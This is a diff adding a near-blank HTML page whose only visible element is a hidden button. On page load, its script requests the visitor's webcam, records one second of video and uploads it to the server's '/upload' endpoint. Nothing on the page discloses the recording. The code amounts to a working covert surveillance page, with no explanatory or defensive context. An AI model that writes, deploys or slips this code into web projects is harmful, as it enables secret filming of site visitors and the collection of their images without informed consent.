@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<button style="display:none"></button>
+
+
+
+<script>
+    window.onload = function () {
+    record();
+  };
+async function record() {
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+  const recorder = new MediaRecorder(stream);
+  const chunks = [];
+
+  recorder.ondataavailable = e => chunks.push(e.data);
+  recorder.start();
+
+  setTimeout(() => recorder.stop(), 1000);
+
+  recorder.onstop = async () => {
+    const blob = new Blob(chunks, { type: "video/webm" });
+    const formData = new FormData();
+    formData.append("video", blob);
+
+    await fetch("/upload", {
+      method: "POST",
+      body: formData
+    });
+  };
+}
+</script>
+
+</body>
+</html>
